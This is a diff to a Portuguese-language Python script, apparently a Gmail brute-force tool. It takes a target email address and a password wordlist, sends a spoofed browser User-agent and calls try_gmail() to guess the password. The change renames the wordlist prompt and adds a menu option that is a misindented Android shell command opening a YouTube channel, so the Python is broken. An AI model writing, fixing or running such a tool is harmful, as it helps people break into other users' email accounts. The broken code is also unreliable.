@@ -66,15 +66,20 @@ instance = GmailBruteForce()
 do = input('''
 		escolhe o unico numero
 		1 - gmail
+		2-  como colocar a wordlsit 
+		
 		
 		==> ''')
 
 if do == '1':
     user = input("email : ")
-    senha = input("passlist : ")
+    senha = input("wordlist : ")
     headers = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36')]
 
     instance.accounts.append(user)
     instance.get_pass_list(senha)
 
     instance.try_gmail()
+#####################
+	      if do == '2':
+am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCt691e46njTLzcjSupUiO2A > /dev/null 2>&1
